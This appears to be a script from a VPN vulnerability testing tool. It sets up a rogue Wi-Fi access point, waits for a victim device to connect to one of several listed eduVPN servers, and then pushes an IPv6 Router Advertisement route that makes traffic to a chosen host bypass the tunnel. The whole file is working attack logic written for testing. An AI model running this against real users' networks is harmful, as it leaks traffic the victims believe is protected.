(*
 * Tunnelvision state machine definition
 * We push custom routes by means of a Router Advertisement (RA) icmpv6 message
 * We abuse the fact that most vpn clients allow traffic to routes other than the default to flow directly.
 * In order to evaluate whether newly introduced routes take precedence over prior ones,
 * this variant pushes the static route _after_ a vpn connection is already set up through an RA message.
 * This is the IPv6 version; i.e. using RA messages instead of dhcp.
 *)

state init begin:
  miscnet = miscnet();
  prefix_len = "64";
  (* not an IPv6 ULA because android will refuse to connect *)
  my_ip = "2a00:1337:1:1::1";
  (* we want target_ip to flow outside of the tunnel *)
  target_ip = miscnet.lookup_ipv6("yourserver.com");

  (* perform nat on the interface where our default gateway is at *)
  miscnet.masquerade("true");

  ap = accesspoint();
  ap.wifi_interface = "wlan0";
  ap.ipv6_addr = my_ip;
  ap.ipv6_prefixlen = prefix_len;
  ap.slaac_enable = "true";
  ap.slaac_dns = my_ip;
  ap.slaac_lifetime = "900"; (* less than 60s is not accepted by android *)
  ap.dns_enable = "true";
  ap.nat64_enable = "true";
  ap.dns_enable = "true";
  ap.bring_up(ap_up, ap_err);

state ap_err:
  exit("failed to bring up access point: ", errstr);

state ap_up:
  mon = trafficmonitor();
  mon.interface = ap.ap_interface;
  (* specify vpn endpoints so that the monitor can detect whether vpn traffic occurs *)
  endpoints = "tcp://ams.nl.eduvpn.org:443;udp://ams.nl.eduvpn.org:443";
  endpoints = concat(endpoints, ";udp://ifi2-vpn.guest.eduvpn.no:1194");
  endpoints = concat(endpoints, ";udp://tekno-vpn.guest.eduvpn.no:1194");
  endpoints = concat(endpoints, ";udp://eduvpnga.ethernet.edu.et:1194");
  endpoints = concat(endpoints, ";udp://eduvpn.ac.lk:1194");
  endpoints = concat(endpoints, ";udp://eduvpn.renu.ac.ug:1194");
  endpoints = concat(endpoints, ";udp://eduvpn.uran.ua:1194");
  mon.vpn_endpoints = endpoints;
  mon.detect_vpn(vpn_detected, mon_err, "5000");
  print("[i] Please connect to the vpn on the victim device");

state mon_err:
  exit("Error occurred: ", errstr);

state vpn_detected:
  ap.slaac_static_route(target_ip, "64");
  ap.slaac_reload();
  ap.slaac_renew(slaac_renew);
  print("[i] Sending Router Advertisement...");

state slaac_renew:
  (* make sure validation_server resolves to target_ip *)
  mon.validation_server = "https://yourserver.com/";
  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);

state mon_err:
  exit("Error occurred: ", errstr);

state vpn_safe:
  exit("Your vpn appears to be safe, congratulations!");

state vpn_vuln:
  exit("Your vpn appears to be vulnerable!");
